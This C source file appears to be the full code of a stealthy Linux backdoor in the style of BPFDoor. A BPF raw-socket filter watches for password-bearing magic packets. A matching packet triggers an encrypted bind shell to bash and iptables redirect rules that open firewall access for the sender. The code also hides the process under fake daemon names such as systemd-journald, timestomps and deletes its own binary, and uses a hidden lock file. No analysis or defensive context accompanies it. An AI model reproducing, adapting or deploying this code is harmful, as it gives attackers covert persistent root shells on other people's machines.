#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pty.h>
#include <termios.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>
#include <netdb.h>
#include <sys/prctl.h>
#include <libgen.h>
#include <sys/time.h>
#include <time.h>
#include <linux/types.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <errno.h>
#include <strings.h>
#include <sys/file.h>

#include <openssl/conf.h>
#include <openssl/err.h>
#include <openssl/ec.h>
#include <openssl/ecdh.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define PORT   "0"
#define BUFFERSIZE 64 * 1024
#define PUBKEY_LEN 66

#ifndef PR_SET_NAME
#define PR_SET_NAME 15
#endif

#ifndef uchar
#define uchar unsigned char
#endif

#define IP_HL(ip) (((ip)->ip_vhl) & 0x0f)

int srv_send = 0;
int srv_recv = 0;
char dredir[128]={0}, dinput[128]={0}, dredir2[128]={0}, doutput[128]={0};
char *loop_ps_argv0 = NULL;
int main_child_pid = 0;
extern char **environ;
int g_fd = 65537;

struct magic_packet{            //24 bytes in total
        char flag[8];           //8 bytes bpf_flag
        unsigned short  port;   //2 bytes port
        char   pass[14];        //1*14 bytes
} __attribute__ ((packed));

struct sniff_ip {
        unsigned char   ip_vhl;
        unsigned char   ip_tos;
        unsigned short int ip_len;
        unsigned short int ip_id;
        unsigned short int ip_off;
        #define IP_RF 0x8000
        #define IP_DF 0x4000
        #define IP_MF 0x2000
        #define IP_OFFMASK 0x1fff
        unsigned char   ip_ttl;
        unsigned char   ip_p;
        unsigned short int ip_sum;
        struct  in_addr ip_src,ip_dst;
};

struct sniff_udp {
        uint16_t uh_sport;
        uint16_t uh_dport;
        uint16_t uh_ulen;
        uint16_t uh_sum;
} __attribute__ ((packed));


struct sniff_sctp {
        unsigned short src_port;
        unsigned short dst_port;
        unsigned int    tag;
        unsigned int checksum;

        unsigned char chunk_type;
        unsigned char chunk_flag;
        unsigned short chunk_len;
        unsigned int tsn;
        unsigned short stream_id;
        unsigned short stream_seqnum;
        unsigned int payload_prctl_id;
} __attribute__ ((packed));

typedef unsigned int tcp_seq;
struct sniff_tcp {
        unsigned short int th_sport;
        unsigned short int th_dport;
        tcp_seq th_seq;
        tcp_seq th_ack;
        unsigned char   th_offx2;
        #define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
        unsigned char   th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        unsigned short int th_win;
        unsigned short int th_sum;
        unsigned short int th_urp;
} __attribute__ ((packed));


struct  config {
        char    pwhash1[32];
        char    pwhash2[32];
        char    disguise[256];
} __attribute__ ((packed));

struct config cfg;
extern int ioctl (int __fd, unsigned long int __request, ...) __THROW;

void del_iptables_rule(){
        if (dredir != NULL){
            system(dredir);
            //puts("dcmd1\n");
        }

        if (dredir != NULL){
            system(dinput);
            //puts("dcmd2\n");
        }

        if (dredir != NULL){
            system(dredir2);
            //puts("dcmd3\n");
        }

        if (dredir != NULL){
            system(doutput);
            //puts("dcmd4\n");
        }
}

static void del_mutex(void)
{
        if (getpid() == main_child_pid)
            unlink("/tmp/....");
        _exit(EXIT_SUCCESS);
}

static void on_del_mutex(int signo)
{
        del_mutex();
}

static void init_signal(void)
{
        atexit(del_mutex);
        signal(SIGTERM, on_del_mutex);
        return;
}

int mutex_init(){
    int fd = open("/tmp/....", O_WRONLY|O_CREAT|O_TRUNC, 0664);
    if(fd == -1){
        //puts("create mutex file fail");
        exit(1);
    }
    flock(fd,LOCK_EX | LOCK_NB);
    if(errno == EWOULDBLOCK){
        //puts("already running");
        exit(1);
    }
    return fd;
}

void mutex_free(int fd){

    flock(fd,LOCK_UN);
    close(fd);
    remove("/tmp/....");

}


int set_proc_name(int argc, char **argv, char *new)
{
        size_t size = 0;
        int i;
        char *raw = NULL;
        char *last = NULL;

        loop_ps_argv0 = argv[0];

        for (i = 0; environ[i]; i++)
                size += strlen(environ[i]) + 1;

        raw = (char *) malloc(size);
        if (NULL == raw)
                return -1;

        for (i = 0; environ[i]; i++)
        {
                memcpy(raw, environ[i], strlen(environ[i]) + 1);
                environ[i] = raw;
                raw += strlen(environ[i]) + 1;
        }

        last = argv[0];

        for (i = 0; i < argc; i++)
                last += strlen(argv[i]) + 1;
        for (i = 0; environ[i]; i++)
                last += strlen(environ[i]) + 1;

        memset(loop_ps_argv0, 0x00, last - loop_ps_argv0);
        strncpy(loop_ps_argv0, new, last - loop_ps_argv0);

        prctl(PR_SET_NAME, (unsigned long) new);
        return 0;
}

static void setup_time(char *file)
{
        struct timeval tv[2];

        tv[0].tv_sec = 1095465599;
        tv[0].tv_usec = 0;

        tv[1].tv_sec = 1095465599;
        tv[1].tv_usec = 0;

        utimes(file, tv);
}

//encryption starts

void handleErrors()
{
    //ERR_print_errors_fp(stderr);
    exit(1);
}


EC_KEY * create_new_private_key()
{
	EC_KEY * prikey;
	if (NULL == (prikey = EC_KEY_new_by_curve_name(NID_X9_62_prime256v1)))
        handleErrors();
        
	if (1 != EC_KEY_generate_key(prikey))
        handleErrors();
        
	return prikey;
}

uchar * compute_secret(	EC_KEY *key, 
                    const EC_POINT *peer_pub_key,
					size_t *secret_len)
{
	int field_size;
	uchar * secret;

	field_size = EC_GROUP_get_degree(EC_KEY_get0_group(key));
	*secret_len = (field_size + 7) / 8;

	if (NULL == (secret = OPENSSL_malloc(*secret_len))) 
        handleErrors();
        
	*secret_len = ECDH_compute_key(secret, *secret_len,
					peer_pub_key, key, NULL);

	if (*secret_len <= 0) {
		OPENSSL_free(secret);
        secret = NULL;
		return NULL;
	}
	return secret;
}


void ecdh_genkey(int sockfd, uchar *out_key){

    EC_KEY * local_prikey = create_new_private_key();

    const EC_POINT * local_pubkey = EC_KEY_get0_public_key(local_prikey);

    const EC_GROUP * ec_group_local;
    if(NULL == (ec_group_local = EC_KEY_get0_group(local_prikey)))
        handleErrors();
        
    char *local_pubkey_char = (char *)(OPENSSL_malloc(PUBKEY_LEN));
    local_pubkey_char = EC_POINT_point2hex(ec_group_local, local_pubkey, POINT_CONVERSION_COMPRESSED, NULL);
    
    //server

    send(sockfd, local_pubkey_char, PUBKEY_LEN, 0); // send local local pubkey to door
    //printf("sending\n");
    //BIO_dump_fp (stdout, local_pubkey_char, PUBKEY_LEN);
    
    char recved_remote_pubkey[PUBKEY_LEN];    
    while(1){   
        ssize_t recvlen = recv(sockfd, recved_remote_pubkey, PUBKEY_LEN, 0);// get server(backdoor's) pubkey
        if((int)recvlen == PUBKEY_LEN) break; 
    }
    //printf("recving from fd:%d\n", sockfd);
    //BIO_dump_fp (stdout, recved_remote_pubkey, PUBKEY_LEN);


    EC_POINT *fmted_remote_pubkey = EC_POINT_new(ec_group_local);
    if(NULL == EC_POINT_hex2point(ec_group_local, recved_remote_pubkey, fmted_remote_pubkey, NULL))
        handleErrors();
        

    size_t local_secret_len;  //secret will be aes key
	uchar *local_secret = (uchar *)(OPENSSL_malloc(32)); 
    local_secret = compute_secret(local_prikey, fmted_remote_pubkey, &local_secret_len);

    memset(local_pubkey_char, 0, PUBKEY_LEN);
    OPENSSL_free(local_pubkey_char);
    local_pubkey_char = NULL;

    memset(recved_remote_pubkey, 0, PUBKEY_LEN);

    EC_KEY_free(local_prikey);
    local_prikey = NULL;

    memcpy(out_key, local_secret, 32);

    memset(local_secret, 0, 32);
    OPENSSL_free(local_secret);
    local_secret = NULL;
    
}



int gcm_encrypt(unsigned char *plaintext, int plaintext_len,
                unsigned char *aad, int aad_len,
                unsigned char *key,
                unsigned char *iv, int iv_len,
                unsigned char *ciphertext,
                unsigned char *tag)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;


    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
        handleErrors();


    if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL))
        handleErrors();


    if(1 != EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv))
        handleErrors();


    if(1 != EVP_EncryptUpdate(ctx, NULL, &len, aad, aad_len))
        handleErrors();


    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;


    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;


    if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag))
        handleErrors();


    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}


int gcm_decrypt(unsigned char *ciphertext, int ciphertext_len,
                unsigned char *aad, int aad_len,
                unsigned char *tag,
                unsigned char *key,
                unsigned char *iv, int iv_len,
                unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;
    int ret;

    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    if(!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
        handleErrors();


    if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL))
        handleErrors();


    if(!EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv))
        handleErrors();


    if(!EVP_DecryptUpdate(ctx, NULL, &len, aad, aad_len))
        handleErrors();


    if(!EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;


    if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag))
        handleErrors();


    ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);

    EVP_CIPHER_CTX_free(ctx);

    if(ret > 0) {
        plaintext_len += len;
        return plaintext_len;
    } else {
        return -1;
    }
}


void unified_encrypt(void *buf, int len, 
            uchar *key,
            uchar *iv,
            uchar *aad,
            uchar *tag,
            uchar *out_buf){

    uchar *sumbuf = (uchar *)(OPENSSL_malloc(16+4+16+4+len));

    uchar *ciphertext = (uchar *)(OPENSSL_malloc(len));

    int ciphertext_len = gcm_encrypt((uchar *)buf, len,
                                        aad, 4, key, iv, 16, ciphertext, tag);
    
    uchar ci_len[4];
    unsigned int tmp_num = htonl((unsigned int)ciphertext_len);
    memcpy(ci_len, &tmp_num, 4);
    
    memcpy(sumbuf, iv, 16);
    memcpy(sumbuf+16, ci_len, 4);
    memcpy(sumbuf+16+4, tag, 16);
    memcpy(sumbuf+16+4+16, aad, 4);
    memcpy(sumbuf+16+4+16+4, ciphertext, ciphertext_len);

    memcpy(out_buf, sumbuf, 16+4+16+4+ciphertext_len);

    OPENSSL_free(ciphertext);
    ciphertext = NULL;

    OPENSSL_free(sumbuf);
    sumbuf = NULL;

}

void unified_decrypt(void *buf, int len, uchar *out_buf, uchar *key){

    uchar iv[16];
    memcpy(iv, buf, 16);

    unsigned int tmp_num = 0;
    memcpy(&tmp_num, buf+16, 4);
    unsigned int ciphertext_len = ntohl(tmp_num);

    uchar tag[16];
    memcpy(tag, buf+16+4, 16);

    uchar aad[4];
    unsigned int tmp = 0;
    memcpy(aad, buf+16+4+16, 4);
    memcpy(&tmp, aad, 4);
    int cli_send = (int)(ntohl(tmp));
    //printf("cli_send:%d\nsrv_recv:%d\n", cli_send, srv_recv);
    /*
    if(cli_send != srv_recv){
        puts("packet sequence verify failure.\n");
        exit(1);
    }*/

    uchar *ciphertext = (uchar *)(OPENSSL_malloc(ciphertext_len));
    memcpy(ciphertext, buf+16+4+16+4, ciphertext_len);
    uchar *plaintext = (uchar *)(OPENSSL_malloc(ciphertext_len));

    int plaintext_len = gcm_decrypt(ciphertext, ciphertext_len,
                                    aad, 4, tag, key, iv, 16, plaintext);
    if(plaintext_len < 0){
        //puts("decrypt verify failed.\n");
        exit(1);
    }

    memcpy(out_buf, plaintext, plaintext_len);

    OPENSSL_free(ciphertext);
    ciphertext = NULL;

    OPENSSL_free(plaintext);
    plaintext = NULL;

}

//encryption ends

int login(const char *pwd)
{
        int x = 0;
        int iter = 1013;    //iter must > 1000
        uchar salt[32] = {0x23,0x54,0xf4,0xab,0x3a,0xb4,0x71,0x93,
                          0x4c,0x89,0xbf,0x17,0x19,0x6d,0xc3,0x80,
                          0x99,0xfe,0xad,0x46,0xde,0x91,0x87,0x36,
                          0x79,0xca,0x30,0x66,0x6a,0xf4,0x1f,0x97};
        uchar hash[32] = {0};
        PKCS5_PBKDF2_HMAC(pwd, 14, salt, sizeof(salt),
                            iter, EVP_sha256(),
                            sizeof(hash), hash);

        x = memcmp(cfg.pwhash1, hash, 32);
        if (x == 0)
                return 0;
        x = memcmp(cfg.pwhash2, hash, 32);
        if (x == 0)
                return 1;

        return 2;
}

//network starts

void sigchld_handler(int s)
{
    (void) s;
    while(waitpid(-1, NULL, WNOHANG) > 0);
    //printf("Connection closed.\n");
}

void *get_in_addr(struct sockaddr *sa) // get sockaddr, IPv4 and IPv6:
{
    if(sa->sa_family == AF_INET) return &(((struct sockaddr_in*) sa)->sin_addr);
    else return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

int statistic(in_addr_t ip, unsigned short port)
{
        struct sockaddr_in remote;
        int      sock;
        int      s_len;

        bzero(&remote, sizeof(remote));
        if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < -1) {
                return -1;
        }
        remote.sin_family = AF_INET;
        remote.sin_port   = port;
        remote.sin_addr.s_addr = ip;

        if ((s_len = sendto(sock, "a", 1, 0, (struct sockaddr *)&remote, sizeof(struct sockaddr))) < 0) {
                close(sock);
                return -1;
        }
        close(sock);
        return s_len;
}


void handle_client(int sockfd)
{

    int master;
    pid_t pid;

    signal(SIGCHLD, SIG_IGN);
    pid = forkpty(&master, NULL, NULL, NULL);


    if(pid < 0)
    {
        //fork pty failed
        return;
    }

    if(pid == 0) 
    {
        execl("/bin/bash", "bash", NULL);
    }
    else
    {

        int maxfd = master > sockfd ? master : sockfd;

        uchar key[32];
        ecdh_genkey(sockfd, key);
        //BIO_dump_fp (stdout, key, 32);

        unsigned int nbytes = 0;

        for(;;)
        {
            char buf[BUFFERSIZE];

            fd_set readfds;
            FD_ZERO(&readfds);
            FD_SET(master, &readfds);
            FD_SET(sockfd, &readfds);

            if(select(maxfd + 1, &readfds, NULL, NULL, NULL) == -1)
            {
                //perror("select");
                return;
            }

            if(FD_ISSET(master, &readfds))
            {
                nbytes = read(master, buf, BUFFERSIZE);
                if(nbytes < 1)
                {
                    //perror("master closed");
                    break;
                }

                uchar iv[16]; // generate iv
                if (!RAND_bytes(iv, 16))
                    handleErrors();

                uchar tag[16];  //prepare gmac tag

                uchar aad[4];  //serialize aad(int)
                unsigned int tmp_num = htonl((unsigned int)srv_send);
                memcpy(aad, &tmp_num, 4);

                uchar *sumbuf = (uchar *)(OPENSSL_malloc(16+4+16+4+nbytes));
                unified_encrypt(buf, nbytes, key, iv, aad, tag, sumbuf);

                send(sockfd, sumbuf, 16+4+16+4+nbytes, 0);
                srv_send = srv_send + 1;

                memset(sumbuf, 0, 16+4+16+4+nbytes);
                OPENSSL_free(sumbuf);
                sumbuf = NULL;

                memset(buf, 0, BUFFERSIZE);                
            }

            if(FD_ISSET(sockfd, &readfds))
            {
                nbytes = recv(sockfd, buf, BUFFERSIZE, 0);
                if(nbytes < 1)
                {
                    //perror("sockfd closed");
                    break;
                }

                uchar *plaintext = (uchar *)(OPENSSL_malloc(nbytes-16-4-16-4));
                unified_decrypt(buf, nbytes, plaintext, key);
                srv_recv = srv_recv + 1;

                write(master, plaintext, nbytes-16-4-16-4);

                memset(plaintext, 0, nbytes-16-4-16-4);
                OPENSSL_free(plaintext);
                plaintext = NULL;

                memset(buf, 0, BUFFERSIZE);
            }
        }
    }
}



int bindshell(char *ip, int fromport){

    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE; // use my IP. "| AI_ADDRCONFIG"
    hints.ai_family = AF_UNSPEC; // AF_INET or AF_INET6 to force version
    hints.ai_family = AF_INET6; // IPv4 addresses will be like ::ffff:127.0.0.1

    struct addrinfo *servinfo;
    getaddrinfo(NULL, PORT, &hints, &servinfo);

#if DEBUG
    for(struct addrinfo *p = servinfo; p != NULL; p = p->ai_next)
    {
        char ipstr[INET6_ADDRSTRLEN];
        inet_ntop(p->ai_family, get_in_addr(p->ai_addr), ipstr, sizeof(ipstr)); // convert the IP to a string
        printf(" %s\n", ipstr);
    }
#endif

    struct addrinfo *servinfo2 = servinfo; //servinfo->ai_next;
    char ipstr[INET6_ADDRSTRLEN];
    inet_ntop(servinfo2->ai_family, get_in_addr(servinfo2->ai_addr), ipstr, sizeof(ipstr));
    //printf("Waiting for connections on [%s]:%s\n", ipstr, PORT);

    int sockfd = socket(servinfo2->ai_family, servinfo2->ai_socktype, servinfo2->ai_protocol);

#if 1
    int flag1 = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &flag1, sizeof(flag1));
#endif

#if 0 // disabling the Nagle algorithm  #include <netinet/tcp.h>
    int flag2 = 1;
    setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &flag2, sizeof(flag2));
#endif

#if 0
    if (addr->ai_family == AF_INET6) {
        int flag3 = 0;
        setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &flag3, sizeof(flag3));
    }
#endif

    bind(sockfd, servinfo2->ai_addr, servinfo2->ai_addrlen);

    freeaddrinfo(servinfo); 

    listen(sockfd, 10);//listen num(default 10)

    struct sockaddr_storage addrl;
    socklen_t lenaddrl = sizeof(addrl);
    getsockname(sockfd, (struct sockaddr *)&addrl, &lenaddrl);

    int toport = (int)(htons(((struct sockaddr_in *)&addrl)->sin_port));
    /*
    if(addrl.ss_family == AF_INET){
        printf("listen on port:%d\n", toport);
    }else{
        printf("listen on port:%d\n", toport);
    }
    */


    char cmd[128] = {0};
    char redir_rule[] = "/sbin/iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d";//compile with string encryption
    char input_rule[] = "/sbin/iptables -I INPUT -p all -s %s -j ACCEPT";

    char redir_rule2[] = "/sbin/iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d";
    char output_rule[] = "/sbin/iptables -I OUTPUT -p all -s %s -j ACCEPT";


    snprintf(cmd, sizeof(cmd), input_rule, ip); //copy rules into cmd buffer
    system(cmd); 
    //puts("cmd1\n");
    sleep(1);

    memset(cmd, 0, sizeof(cmd));

    snprintf(cmd, sizeof(cmd), redir_rule, ip, fromport, toport);
    system(cmd); 
    //puts("cmd2\n");
    sleep(1);

    memset(cmd, 0, sizeof(cmd));

    snprintf(cmd, sizeof(cmd), output_rule, ip);
    system(cmd); 
    //puts("cmd3\n");
    sleep(1);

    memset(cmd, 0, sizeof(cmd));

    snprintf(cmd, sizeof(cmd), redir_rule2, ip, toport, fromport);
    system(cmd); 
    //puts("cmd4\n");
    sleep(1);

//  delete added rules
    
    char dredir_rule[] = "/sbin/iptables -t nat -D PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d";
    char dinput_rule[] = "/sbin/iptables -D INPUT -p all -s %s -j ACCEPT";
    char dredir_rule2[] = "/sbin/iptables -t nat -D PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d";
    char doutput_rule[] = "/sbin/iptables -D OUTPUT -p all -s %s -j ACCEPT";
    snprintf(dredir, sizeof(dredir), dredir_rule, ip, fromport, toport);
    snprintf(dinput, sizeof(dinput), dinput_rule, ip);
    snprintf(dredir2, sizeof(dredir2), dredir_rule2, ip, toport, fromport);
    snprintf(doutput, sizeof(doutput), doutput_rule, ip);

/*
#if 1
    struct sigaction sa;
    sa.sa_handler = sigchld_handler; // reap all dead processes
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    sigaction(SIGCHLD, &sa, NULL);
#else
    signal(SIGCHLD, SIG_IGN);
#endif
*/
    while(1)
    {
        struct sockaddr_storage their_addr; // connector's address information
        socklen_t addr_size = sizeof(their_addr);
        int new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &addr_size);

        char ipstr[INET6_ADDRSTRLEN];
        inet_ntop(their_addr.ss_family, get_in_addr((struct sockaddr *)&their_addr), ipstr, sizeof(ipstr));
        //printf("Got a connection from %s [%d]\n", ipstr, new_fd);

        if(!fork()) // if this is the child process
        {
            close(sockfd); // child doesn't need the listener
            setsid();
            handle_client(new_fd);
            //mutex_free(g_fd);
            close(new_fd);
            exit(0);
            return 0;
        }

        close(new_fd);  // parent doesn't need this
    }
    return 0;
}

//network ends


void packet_loop()
{
        int sock, recv_len, size_ip, size_tcp, pid;

        uchar buff[512];
        const struct sniff_ip *ip;
        struct magic_packet *mp;
        const struct sniff_udp *udp;
        const struct sniff_tcp *tcp;
        const struct sniff_sctp *sctp;
        in_addr_t srcip;
        char *pbuff = NULL;

        struct sock_fprog filter;
        struct sock_filter bpf_code[] = {

{ 0x28, 0, 0, 0x0000000c },
{ 0x15, 0, 44, 0x00000800 },
{ 0x30, 0, 0, 0x00000017 },
{ 0x15, 0, 15, 0x00000006 },
{ 0x28, 0, 0, 0x00000014 },
{ 0x45, 40, 0, 0x00001fff },
{ 0xb1, 0, 0, 0x0000000e },
{ 0x50, 0, 0, 0x0000001a },
{ 0x54, 0, 0, 0x000000f0 },
{ 0x74, 0, 0, 0x00000002 },
{ 0xc, 0, 0, 0x00000000 },
{ 0x7, 0, 0, 0x00000000 },
{ 0x50, 0, 0, 0x0000000f },
{ 0x15, 0, 32, 0x000000d3 },
{ 0x50, 0, 0, 0x00000011 },
{ 0x15, 0, 30, 0x000000fc },
{ 0x50, 0, 0, 0x00000014 },
{ 0x15, 0, 28, 0x00000034 },
{ 0x6, 0, 0, 0x0000ffff },
{ 0x15, 0, 8, 0x00000011 },
{ 0x28, 0, 0, 0x00000014 },
{ 0x45, 24, 0, 0x00001fff },
{ 0xb1, 0, 0, 0x0000000e },
{ 0x48, 0, 0, 0x00000018 },
{ 0x15, 0, 21, 0x000093f7 },
{ 0x50, 0, 0, 0x0000001d },
{ 0x15, 0, 19, 0x000000c3 },
{ 0x6, 0, 0, 0x0000ffff },
{ 0x15, 0, 10, 0x00000001 },
{ 0x28, 0, 0, 0x00000014 },
{ 0x45, 15, 0, 0x00001fff },
{ 0xb1, 0, 0, 0x0000000e },
{ 0x50, 0, 0, 0x0000000e },
{ 0x15, 0, 12, 0x00000008 },
{ 0x50, 0, 0, 0x00000018 },
{ 0x15, 0, 10, 0x000000f3 },
{ 0x50, 0, 0, 0x0000001b },
{ 0x15, 0, 8, 0x000000e6 },
{ 0x6, 0, 0, 0x0000ffff },
{ 0x15, 0, 6, 0x00000084 },
{ 0x28, 0, 0, 0x00000014 },
{ 0x45, 4, 0, 0x00001fff },
{ 0xb1, 0, 0, 0x0000000e },
{ 0x40, 0, 0, 0x0000002b },
{ 0x15, 0, 1, 0x98ef7685 },
{ 0x6, 0, 0, 0x0000ffff },
{ 0x6, 0, 0, 0x00000000 },

        };

        filter.len = sizeof(bpf_code)/sizeof(bpf_code[0]);
        filter.filter = bpf_code;

        if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 1)
                return;

        if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) == -1) {
                return;
        }

        while (1) {
                memset(buff, 0, 512);
                recv_len = recvfrom(sock, buff, 512, 0x0, NULL, NULL);
                ip = (struct sniff_ip *)(buff+14);
                size_ip = IP_HL(ip)*4;
                if (size_ip < 20) continue;             


                switch(ip->ip_p) {
                        case IPPROTO_ICMP:
                                pbuff = (char *)(ip+1);
                                mp = (struct magic_packet *)(pbuff+8); 
                                break;
                        case IPPROTO_UDP:
                                udp = (struct sniff_udp *)(ip+1);
                                mp = (struct magic_packet *)(udp+1);
                                break;
                        case IPPROTO_TCP:
                                tcp = (struct sniff_tcp*)(buff+14+size_ip);
                                size_tcp = TH_OFF(tcp)*4;
                                mp = (struct magic_packet *)(buff+14+size_ip+size_tcp);
                                break;
                        case IPPROTO_SCTP:
                                sctp = (struct sniff_sctp *)(ip+1);
                                mp = (struct magic_packet *)(sctp+1);
                                break;
                        default:
                                //puts("[!]no protocol detected.\n");
                                break;
                }
                

                if (mp) {
                        srcip = ip->ip_src.s_addr;
                        pid = fork();
                        if (pid) {
                            waitpid(pid, NULL, WNOHANG);  //fork()+waitpid(): also an anti-debug method
                        }
                        else {               
                                int cmp = 0;
                                char pname[] = "/usr/sbin/kerneloops --test";
                                if (fork()) exit(0);
                                chdir("/");
                                setsid();
                                memset(loop_ps_argv0, 0, strlen(loop_ps_argv0));
                                strcpy(loop_ps_argv0, pname);
                                prctl(PR_SET_NAME, (unsigned long) pname);
                                cmp = login(mp->pass);

                                int mpport = (int)(mp->port);
                                if(mp->port <= 0){
                                        //printf("[!]port %d unavailable.\n",mpport);
                                        continue;
                                }

                                //printf("[+]port recved:%d\n",mpport);
                                //printf("[+]pass recved:%s\n",mp->pass);

                                char sip[128] = {0};
                                switch(cmp) {
                                    case 0:
                                            //puts("case 0 activated.\n");
                                            strcpy(sip, inet_ntoa(ip->ip_src));
                                            bindshell(sip, mpport);
                                            continue;
                                    case 1:
                                            //puts("case 1 activated.\n");
                                            del_iptables_rule();
                                            continue;
                                    default:
                                            //puts("no passwd match.\n");
                                            statistic(srcip, mpport);
                                            continue;
                                }
                            //mutex_free(g_fd);
                            exit(0);
                        }
                    //mutex_free(g_fd);
                }
                
        }
    close(sock);
}



int main(int argc, char *argv[])
{
    if (getuid() != 0) 
        return 0;

    srand((unsigned)time(NULL));

    g_fd = mutex_init();
    char pwd1[32] = {0xea,0x53,0x9c,0x6c,0x2e,0x78,0x6f,0x6d,
                    0x70,0x19,0x2f,0xb9,0xab,0xb3,0xd0,0xc1,
                    0x94,0x42,0x25,0x26,0x7b,0x28,0x9c,0xd3,
                    0xcc,0x8e,0x7c,0x9e,0xc4,0xb8,0xa7,0x85};//password hash 1

    char pwd2[32] = {0x82,0xfd,0x27,0x82,0x72,0x14,0xea,0x61,
                    0xe1,0xc9,0x1a,0x95,0xc7,0xf,0xc0,0x3b,
                    0x36,0x99,0x69,0xe8,0xf3,0xc5,0x88,0x1b,
                    0x14,0x7e,0xda,0x90,0x5a,0x37,0x7b,0x34};//password hash 2

    char *disguise_name[] = {
        "/usr/lib/systemd/systemd-journald",
        "/usr/bin/dbus-daemon --system --address=systemd: --nofork --systemd-activation",
        "avahi-daemon: chroot helper"
    };

    memset(&cfg, 0, sizeof(cfg));

    memcpy(cfg.pwhash1, pwd1, 32);
    memcpy(cfg.pwhash2, pwd2, 32);
    strcpy(cfg.disguise, disguise_name[rand()%3]);

    char argv0_bk[128] = {0};
    strcpy(argv0_bk, argv[0]);

    set_proc_name(argc, argv, cfg.disguise);
    setup_time(argv0_bk);
    unlink(argv0_bk);

    struct sigaction sa;
    sa.sa_handler = sigchld_handler; // reap defunct procs
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    sigaction(SIGCHLD, &sa, NULL);

    if (fork()) exit(0);
    main_child_pid = getpid();
    packet_loop();

    mutex_free(g_fd);

    return 0;
}